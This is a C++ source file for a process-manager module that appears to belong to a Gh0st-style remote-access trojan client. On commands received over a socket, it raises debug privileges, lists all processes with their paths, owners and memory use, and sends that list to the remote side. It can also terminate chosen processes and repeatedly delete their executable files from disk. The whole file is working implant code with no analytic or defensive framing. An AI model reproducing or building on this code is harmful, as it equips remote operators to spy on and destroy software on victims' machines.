// ProgressManager.cpp: implementation of the CProgressManager class.
//
//////////////////////////////////////////////////////////////////////
#include "stdafx.h"
#include "ProgressManager.h"
#include <psapi.h>
#pragma comment(lib,"Psapi.lib")
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CProgressManager::CProgressManager(CClientSocket *pClient) : CManager(pClient)
{
	SendProcessList();
}

CProgressManager::~CProgressManager()
{

}

void CProgressManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
		// 发送进程信息
	case COMMAND_PSLIST:
		SendProcessList();
		break;
	case COMMAND_KILLPROCESS:
		KillProcess((LPBYTE)lpBuffer + 1, nSize - 1);
		SendProcessList();
		break;
	default:
		break;
	}
}

void CProgressManager::SendProcessList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = GetProcessList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

BOOL DebugPrivilegel(const char *PName,BOOL bEnable)
{
	BOOL              bResult = TRUE;
	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;
	
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
	
	LookupPrivilegeValue(NULL, PName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    if (GetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}
	
	CloseHandle(hToken);
	return bResult;	
}

BOOL DosPathToNtPath(LPTSTR pszDosPath, LPTSTR pszNtPath)
{
	TCHAR			szDriveStr[500];
	TCHAR			szDrive[3];
	TCHAR			szDevName[100];
	INT				cchDevName;
	INT				i;
	
	//检查参数
	if(!pszDosPath || !pszNtPath )
		return FALSE;
	
	//获取本地磁盘字符串
	if(GetLogicalDriveStrings(sizeof(szDriveStr), szDriveStr))
	{
		for(i = 0; szDriveStr[i]; i += 4)
		{
			if(!lstrcmpi(&(szDriveStr[i]), "A:\\") || !lstrcmpi(&(szDriveStr[i]), "B:\\"))
				continue;
			
			szDrive[0] = szDriveStr[i];
			szDrive[1] = szDriveStr[i + 1];
			szDrive[2] = '\0';
			if(!QueryDosDevice(szDrive, szDevName, 100))//查询 Dos 设备名
				return FALSE;
			
			cchDevName = lstrlen(szDevName);
			if(strncmp(pszDosPath, szDevName, cchDevName) == 0)//命中
			{
				lstrcpy(pszNtPath, szDrive);//复制驱动器
				lstrcat(pszNtPath, pszDosPath + cchDevName);//复制路径
				return TRUE;
			}			
		}
	}
	
	lstrcpy(pszNtPath, pszDosPath);
	
	return FALSE;
}

BOOL GetProcessUserName(HANDLE hProcess, TCHAR * strProcessUser)
{
	HANDLE hToken = NULL;
	BOOL bFuncReturn = FALSE;
	PTOKEN_USER pToken_User = NULL;
	DWORD dwTokenUser = 0;
	TCHAR szAccName[MAX_PATH] = {0};
	TCHAR szDomainName[MAX_PATH] = {0};
	HANDLE hProcessToken = NULL;
	if(hProcess != NULL)
	{
		// 提升本进程的权限
		bFuncReturn = ::OpenProcessToken(hProcess,TOKEN_QUERY,&hToken);
		if( bFuncReturn == 0) // 失败
			return FALSE;
		
		if(hToken != NULL)
		{
			::GetTokenInformation(hToken, TokenUser, NULL,0L, &dwTokenUser);
			if(dwTokenUser>0)
			{
				pToken_User = (PTOKEN_USER)::GlobalAlloc( GPTR, dwTokenUser );
			}
			
			if(pToken_User != NULL)
			{
				bFuncReturn = ::GetTokenInformation(hToken, TokenUser, pToken_User, dwTokenUser, &dwTokenUser);
			}
			
			if(bFuncReturn != FALSE && pToken_User != NULL)
			{
				SID_NAME_USE eUse  = SidTypeUnknown;
				DWORD dwAccName    = 0L; 
				DWORD dwDomainName = 0L;
				PSID  pSid = pToken_User->User.Sid;
				bFuncReturn = ::LookupAccountSid(NULL, pSid, NULL, &dwAccName,
					NULL,&dwDomainName,&eUse );
				
				if(dwAccName>0 && dwAccName < MAX_PATH && dwDomainName>0 && dwDomainName <= MAX_PATH)
				{
					bFuncReturn = ::LookupAccountSid(NULL,pSid,szAccName,&dwAccName,
						szDomainName,&dwDomainName,&eUse );
				}
				
				if( bFuncReturn != 0)
					lstrcpy(strProcessUser,szAccName);
				
			}
		}
	}
	
	if (pToken_User != NULL)
		::GlobalFree( pToken_User );
	
	if(hToken != NULL)
		::CloseHandle(hToken);
	
	return TRUE;
}

LPBYTE CProgressManager::GetProcessList()
{
	HANDLE			hSnapshot = NULL;
	HANDLE			hProcess = NULL;
	HMODULE			hModules = NULL;
	PROCESSENTRY32	pe32 = {0};
	DWORD			cbNeeded;
	char			strProcessName[MAX_PATH] = {0};
	char            strProcessUser[MAX_PATH] = {0};
	TCHAR           szImagePath[MAX_PATH] ={0};
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	DWORD			dwLength = 0;
	DWORD           dwWorkingSetSize = 0;
	DWORD           dwFileSize = 0;
	PROCESS_MEMORY_COUNTERS pmc;
	DebugPrivilegel(SE_DEBUG_NAME, TRUE);
	
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	if(hSnapshot == INVALID_HANDLE_VALUE)
		return NULL;
	
	pe32.dwSize = sizeof(PROCESSENTRY32);
	
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	
	lpBuffer[0] = TOKEN_PSLIST;
	dwOffset = 1;
	
	if(Process32First(hSnapshot, &pe32))
	{	  
		do
		{      
			hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
			if ((pe32.th32ProcessID !=0 ) && (pe32.th32ProcessID != 4) && (pe32.th32ProcessID != 8))
			{
				EnumProcessModules(hProcess, &hModules, sizeof(hModules), &cbNeeded);
				
				if(0 == GetProcessImageFileName(hProcess, szImagePath, MAX_PATH))
				{
					lstrcpy(strProcessName, "unknown erro");
					
				}
				else if(!DosPathToNtPath( szImagePath,strProcessName))
				{
					
				}

				memset(strProcessUser,0,sizeof(strProcessUser));
				if (GetProcessUserName(hProcess,strProcessUser))
				{
					if (lstrlen(strProcessUser) == 0)
					{
						lstrcpy(strProcessUser,"ERROR 2");
					}
				}
				else
				{
					lstrcpy(strProcessUser,"ERROR 1");
				}
				
				// 此进程占用数据大小
				dwLength = sizeof(DWORD)*5 + lstrlen(pe32.szExeFile) + lstrlen(strProcessName) + lstrlen(strProcessUser) + 3;
				// 缓冲区太小，再重新分配下
				if (LocalSize(lpBuffer) < (dwOffset + dwLength))
					lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);
				
				memcpy(lpBuffer + dwOffset, &(pe32.th32ProcessID), sizeof(DWORD));
				dwOffset += sizeof(DWORD);	
				
				memcpy(lpBuffer + dwOffset, pe32.szExeFile, lstrlen(pe32.szExeFile) + 1);
				dwOffset += lstrlen(pe32.szExeFile) + 1;
				
				memcpy(lpBuffer + dwOffset, strProcessName, lstrlen(strProcessName) + 1);
				dwOffset += lstrlen(strProcessName) + 1;


				DWORD dwPriClass = GetPriorityClass(hProcess);
 				memcpy(lpBuffer + dwOffset, &dwPriClass, sizeof(DWORD) );
				dwOffset += sizeof(DWORD);

				dwPriClass = pe32.cntThreads;
				memcpy(lpBuffer + dwOffset, &dwPriClass, sizeof(DWORD) );
				dwOffset += sizeof(DWORD);

				memcpy(lpBuffer + dwOffset, strProcessUser, lstrlen(strProcessUser) + 1);
				dwOffset += lstrlen(strProcessUser) + 1;

				ZeroMemory(&pmc,sizeof(pmc));
				pmc.cb = sizeof(PROCESS_MEMORY_COUNTERS);
				if (GetProcessMemoryInfo( hProcess, &pmc, sizeof(pmc)) )
				{
					dwWorkingSetSize = (DWORD)(pmc.WorkingSetSize/1024);		//单位为k
				}
				else
					dwWorkingSetSize = 0;

				memcpy(lpBuffer + dwOffset, &dwWorkingSetSize, sizeof(DWORD));
				dwOffset += sizeof(DWORD);


				HANDLE handle = CreateFile(strProcessName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
				if (handle != INVALID_HANDLE_VALUE)
				{
					dwFileSize = GetFileSize(handle, NULL)  / 1024;
					CloseHandle(handle);
				}
				else
					dwFileSize = 0;

				memcpy(lpBuffer + dwOffset, &dwFileSize, sizeof(DWORD));
				dwOffset += sizeof(DWORD);

			}

			CloseHandle(hProcess);//新修改
		}
		while(Process32Next(hSnapshot, &pe32));
	}
	
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	
	DebugPrivilegel(SE_DEBUG_NAME, FALSE); 
	CloseHandle(hSnapshot);
	return lpBuffer;	
}
void CProgressManager::KillProcess(LPBYTE lpBuffer, UINT nSize)
{
	HANDLE hProcess = NULL;
	DebugPrivilegel(SE_DEBUG_NAME, TRUE);
	nSize -=1;
	char    strProcessName[MAX_PATH] = {0};
	
	for (UINT i = 0; i < nSize; i += 4)
	{
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *(LPDWORD)(lpBuffer + 1 + i));
		GetModuleFileNameEx(hProcess,NULL,strProcessName, sizeof(strProcessName));
		BOOL bProcess = TerminateProcess(hProcess, 0);
		
		if (lpBuffer[0] && bProcess)
		{			
			int n = 0;
			while(1)
			{
				DeleteFile(strProcessName);
				Sleep(200);
				if(GetFileAttributes(strProcessName) == -1)  //检查文件不存在  退出
					break;
				n ++ ;
				if(n >= 10)  //无法删除 一段时间后退出
					break;
			}
		}
		CloseHandle(hProcess);
	}
	DebugPrivilegel(SE_DEBUG_NAME, FALSE);
	// 稍稍Sleep下，防止出错
	Sleep(100);
}
